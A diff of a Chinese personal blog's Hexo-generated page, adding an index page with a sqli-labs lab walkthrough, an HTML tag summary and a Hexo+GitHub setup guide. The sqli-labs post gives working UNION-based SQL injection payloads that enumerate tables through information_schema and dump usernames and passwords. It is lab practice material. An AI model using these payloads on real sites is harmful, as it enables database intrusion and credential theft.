@@ -20,38 +20,28 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="目录结构​          安装Node.js​          添加国内镜像源​          安装Git​          注册Github账号​          安装Hexo​          连接Github与本地 安装Node.js首先下载稳定版Node.js，我这里给的是64位的。安装选项全部默认，一路点击Next。最后安装好之后，按Win+R打开命令提示符，输入node">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Hexo+Github博客详细教程">
-<meta property="og:url" content="http://example.com/2020/10/18/article-title/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Yanghaoxuan&#39;sBlog">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Yanghaoxuan&#39;sBlog">
-<meta property="og:description" content="目录结构​          安装Node.js​          添加国内镜像源​          安装Git​          注册Github账号​          安装Hexo​          连接Github与本地 安装Node.js首先下载稳定版Node.js，我这里给的是64位的。安装选项全部默认，一路点击Next。最后安装好之后，按Win+R打开命令提示符，输入node">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="c:/Users/Y4n9ne/Pictures/Screenshots/屏幕截图(3).png">
-<meta property="og:image" content="c:/Users/Y4n9ne/Pictures/Screenshots/屏幕截图(5).png">
-<meta property="og:image" content="https://godweiyang.com/2018/04/13/hexo-blog/3.jpg">
-<meta property="og:image" content="https://godweiyang.com/2018/04/13/hexo-blog/5.jpg">
-<meta property="og:image" content="https://godweiyang.com/2018/04/13/hexo-blog/6.jpg">
-<meta property="article:published_time" content="2020-10-18T11:45:26.000Z">
-<meta property="article:modified_time" content="2020-10-18T13:38:24.940Z">
 <meta property="article:author" content="Yanghaoxuan">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:/Users/Y4n9ne/Pictures/Screenshots/屏幕截图(3).png">
 
-<link rel="canonical" href="http://example.com/2020/10/18/article-title/">
+<link rel="canonical" href="http://example.com/page/2/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : false,
-    isPost : true,
+    isHome : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>Hexo+Github博客详细教程 | Yanghaoxuan'sBlog</title>
+  <title>Yanghaoxuan'sBlog</title>
   
 
 
@@ -149,10 +139,203 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/article-title-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/12/article-title-2/" class="post-title-link" itemprop="url">sqli-labs练习(第一、二关):字符型与数字型</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-12 14:05:01 / 修改时间：15:08:57" itemprop="dateCreated datePublished" datetime="2020-12-12T14:05:01+08:00">2020-12-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
 
     
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="第一关（字符型）"><a href="#第一关（字符型）" class="headerlink" title="第一关（字符型）"></a>第一关（字符型）</h1><h2 id="1、判断是数字型还是字符型"><a href="#1、判断是数字型还是字符型" class="headerlink" title="1、判断是数字型还是字符型"></a>1、判断是数字型还是字符型</h2><p>在url后面分别添加<code>?id=1, ?id=2, ?id=2-1</code> ，观察页面的变化，判断是字符型还是数字型。<br>（如果id=2-1 与 id=1的页面一样，就是数字型；如果id=2-1与id=2的页面一样，就是字符型）</p>
+<h2 id="2、通过报错判断闭合符"><a href="#2、通过报错判断闭合符" class="headerlink" title="2、通过报错判断闭合符"></a>2、通过报错判断闭合符</h2><p>在id=2后面分别加上<code>&#39;</code> , <code>&quot;</code> 即单引号，双引号，发现加<code>&#39;</code>时报错了，而加<code>&quot;</code>是正常显示，说明闭合符是<code>&#39;</code>。所以我们应该使用<code>&#39;</code>，让它闭合。</p>
+<h2 id="3、确认查询的字段数量"><a href="#3、确认查询的字段数量" class="headerlink" title="3、确认查询的字段数量"></a>3、确认查询的字段数量</h2><p>在后面分别添加<code>order by 1 --+</code>，<code>order by 2 --+</code>，<code>order by 3 --+</code>……<code>order by n --+</code>，观察是否报错，我们发现在by 3的时候还是正常的，而by 4的时候就没了，说明要查询的字段数量是3个。</p>
+<h2 id="4、确认占位信息"><a href="#4、确认占位信息" class="headerlink" title="4、确认占位信息"></a>4、确认占位信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…… union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>把id的值换成-1，不让它显示正常的值，然后在后面加上union select 1,2,3 –+。查看字段的占位信息。</p>
+<p><img src="C:\Users\Y4n9ne\Desktop\20200717113323491.png" alt="20200717113323491"></p>
+<p>1的位置是dhakkan，固定的，只能在2,3下手。</p>
+<h2 id="5、找库名"><a href="#5、找库名" class="headerlink" title="5、找库名"></a>5、找库名</h2><p><code>…… union select 1,2,database() --+</code>，把3换成database(),即在输出3的地方输出数据库名。</p>
+<p><img src="C:\Users\Y4n9ne\Desktop\20200717113457752.png" alt="20200717113457752"></p>
+<p>发现数据库名字是<code>security</code></p>
+<h2 id="6、查表名"><a href="#6、查表名" class="headerlink" title="6、查表名"></a>6、查表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…… union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>
+
+<p>group_concat()是把要输出的内容都放在一个分组里输出，如果不加的话，就只会输出第一个表名。</p>
+<h2 id="7、找表字段"><a href="#7、找表字段" class="headerlink" title="7、找表字段"></a>7、找表字段</h2><p>至于找哪个表里的内容，当然是users表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…… union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Y4n9ne\Desktop\20200717114338128.png" alt="20200717114338128"></p>
+<p>users表里有id，username，password三个字段。</p>
+<h2 id="8、找用户名和密码"><a href="#8、找用户名和密码" class="headerlink" title="8、找用户名和密码"></a>8、找用户名和密码</h2><p><code>…… union select 1,2,group_concat(concat_ws(&#39;,&#39;,username,password)) from users --+</code></p>
+<p>concat_ws这个函数将username和password用逗号分开。</p>
+<h1 id="第二关（数字型）"><a href="#第二关（数字型）" class="headerlink" title="第二关（数字型）"></a>第二关（数字型）</h1><h2 id="1、先判断是字符型还是数字型。"><a href="#1、先判断是字符型还是数字型。" class="headerlink" title="1、先判断是字符型还是数字型。"></a>1、先判断是字符型还是数字型。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.11.222&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>id=2-1 与 id=1的结果一样，说明是数字型。</p>
+<h2 id="2、确认字段位数"><a href="#2、确认字段位数" class="headerlink" title="2、确认字段位数"></a>2、确认字段位数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.11.222&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3</span><br></pre></td></tr></table></figure>
+
+<p>接下来的步骤与第一关相同，只是少了第二步的<code>&quot;</code> 或 <code>&#39;</code>而已。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/23/article-title-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/23/article-title-1/" class="post-title-link" itemprop="url">自学HTML总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-23 21:57:50" itemprop="dateCreated datePublished" datetime="2020-10-23T21:57:50+08:00">2020-10-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-08 09:06:10" itemprop="dateModified" datetime="2020-11-08T09:06:10+08:00">2020-11-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>HTML，超文本标记语言，没有变量，没有循环，没有函数，只是一门静态的语言。人们可以用来描述静态的东西，比如标题，段落，图片。</p>
+<p>如果说我们要描述一个网页，我们可以说：</p>
+<p>在页面的顶部有一栏标题栏，下面有张大图，大图下面三张图和图片介绍，图文下面有一个标题，标题下面有三个图文链接介绍。</p>
+<p>这只是对网页进行直观的描述，但是对于浏览器来说，需要一个精确的描述。比如：大图下面三张图和图片介绍，介绍中哪些文字需要强调？图文下面的标题是主标题还是二级标题？</p>
+<p>这些都是HTML要表述的。配上CSS来精确的描述字体的颜色，粗细，大小，图片的宽高，按钮的位置。</p>
+<p>入门容易，精通难，切学且珍惜！</p>
+<p>在这里推荐一个我认为比较好的练习HTML的方法：抛开CSS，做纯粹的代码练习。其实就是单纯的书写HTML，最终的目的是他人可以通过阅读这个HTML文件理解到页面是怎样的结构，甚至可以通过HTML代码来画出大概的页面。以下是HTML基本（常用）标签的整理，希望对你有帮助。</p>
+<p><code>基本</code></p>
+<p><code>&lt;html&gt;…&lt;/html&gt; 定义 HTML 文档</code></p>
+<p><code>&lt;head&gt;…&lt;/head&gt; 文档的信息</code></p>
+<p><code>&lt;meta&gt; HTML 文档的元信息</code></p>
+<p><code>&lt;title&gt;…&lt;/title&gt; 文档的标题</code></p>
+<p><code>&lt;link&gt; 文档与外部资源的关系</code></p>
+<p><code>&lt;style&gt;…&lt;/style&gt; 文档的样式信息</code></p>
+<p><code>&lt;body&gt;…&lt;/body&gt; 可见的页面内容</code></p>
+<p><code>&lt;!--…--&gt; 注释</code></p>
+<p><code>文本</code></p>
+<p><code>&lt;h1&gt;...&lt;/h1&gt; 标题字大小（h1~h6）</code></p>
+<p><code>&lt;b&gt;...&lt;/b&gt; 粗体字</code></p>
+<p><code>&lt;strong&gt;...&lt;/strong&gt; 粗体字(强调)</code></p>
+<p><code>&lt;i&gt;...&lt;/i&gt; 斜体字</code></p>
+<p><code>&lt;em&gt;...&lt;/em&gt; 斜体字(强调)</code></p>
+<p><code>&lt;u&gt;...&lt;/u&gt; 下划线</code></p>
+<p><code>&lt;del&gt;...&lt;/del&gt; 删除线(表示删除)</code></p>
+<p><code>&lt;center&gt;…&lt;/center&gt; 居中文本(HTMl5已不支持center标签，可用样式text-align:center代替)</code></p>
+<p><code>&lt;ul&gt;…&lt;/ul&gt; 无序列表</code></p>
+<p><code>&lt;ol&gt;…&lt;/ol&gt; 有序列表</code></p>
+<p><code>&lt;li&gt;…&lt;/li&gt; 列表项目</code></p>
+<p><code>&lt;a href=&quot;…&quot;&gt;…&lt;/a&gt; 超链接</code></p>
+<p><code>&lt;font&gt; 定义文本字体尺寸、颜色、大小</code></p>
+<p><code>&lt;sub&gt; 下标</code></p>
+<p><code>&lt;sup&gt; 上标</code></p>
+<p><code>&lt;br&gt; 换行</code></p>
+<p><code>&lt;p&gt; 段落</code></p>
+<p><code>图形</code></p>
+<p><code>&lt;img src=&#39;”…&quot;&gt; 定义图像</code></p>
+<p><code>&lt;hr&gt; 水平线</code></p>
+<p><code>表格</code></p>
+<p><code>&lt;table&gt;…&lt;/table&gt; 定义表格</code></p>
+<p><code>&lt;th&gt;…&lt;/th&gt; 定义表格中的表头单元格</code></p>
+<p><code>&lt;tr&gt;…&lt;/tr&gt; 定义表格中的行</code></p>
+<p><code>&lt;td&gt;…&lt;/td&gt; 定义表格中的单元</code></p>
+<p><code>其它</code></p>
+<p><code>&lt;form&gt;…&lt;/form&gt; 定义供用户输入的 HTML 表单</code></p>
+<p><code>&lt;frame&gt; 定义框架集的窗口或框架</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -168,9 +351,10 @@
       <meta itemprop="name" content="Yanghaoxuan'sBlog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          Hexo+Github博客详细教程
-        </h1>
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/18/article-title/" class="post-title-link" itemprop="url">Hexo+Github博客详细教程</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -194,7 +378,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>​          安装Node.js<br>​          添加国内镜像源<br>​          安装Git<br>​          注册Github账号<br>​          安装Hexo<br>​          连接Github与本地</p>
+          <h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>​          安装Node.js<br>​          添加国内镜像源<br>​          安装Git<br>​          注册Github账号<br>​          安装Hexo<br>​          连接Github与本地</p>
 <h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><p>首先下载稳定版Node.js，我这里给的是64位的。<br>安装选项全部默认，一路点击Next。<br>最后安装好之后，按Win+R打开命令提示符，输入node -v和npm -v，如果出现版本号，那么就安装成功了。<br>安装Git<br>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具————Git[下载地址]。<br>安装选项还是全部默认，只不过最后一步添加路径时选择Use Git from the Windows Command Prompt，这样我们就可以直接在命令提示符里打开git了。<br>安装完成后在命令提示符中输入git –version验证是否安装成功</p>
 <h1 id="注册Github账号"><a href="#注册Github账号" class="headerlink" title="注册Github账号"></a>注册Github账号</h1><p>接下来就去注册一个github账号，用来存放我们的网站。大多数小伙伴应该都有了吧，作为一个合格的程序猿（媛）还是要有一个的。</p>
 <p>打开<a target="_blank" rel="noopener" href="https://github.com/%EF%BC%8C%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%EF%BC%8C%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%EF%BC%9A">https://github.com/，新建一个项目，如下所示：</a><img src="C:\Users\Y4n9ne\Pictures\Screenshots\屏幕截图(3).png" alt="屏幕截图(3)" style="zoom:75%;" /></p>
@@ -233,31 +417,25 @@
 <p>Bash</p>
 <p>repository修改为你自己的github项目地址(注意，如果仓库地址是在GitHub内复制粘贴进来的话，地址后面的句号一定要删除，本人无数次的搭建失败就是因为这个原因)。</p>
 
+      
     </div>
 
     
     
     
-
       <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item"></div>
-      <div class="post-nav-item">
-    <a href="/2020/10/23/article-title-1/" rel="next" title="自学HTML总结">
-      自学HTML总结 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
+        <div class="post-eof"></div>
       </footer>
-    
   </article>
   
   
   
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
 
 
 
@@ -309,7 +487,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-number">1.</span> <span class="nav-text">目录结构</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85Node-js"><span class="nav-number"></span> <span class="nav-text">安装Node.js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%86%8CGithub%E8%B4%A6%E5%8F%B7"><span class="nav-number"></span> <span class="nav-text">注册Github账号</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85Hexo"><span class="nav-number"></span> <span class="nav-text">安装Hexo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5Github%E4%B8%8E%E6%9C%AC%E5%9C%B0"><span class="nav-number"></span> <span class="nav-text">连接Github与本地</span></a></div>
       </div>
       <!--/noindex-->
 
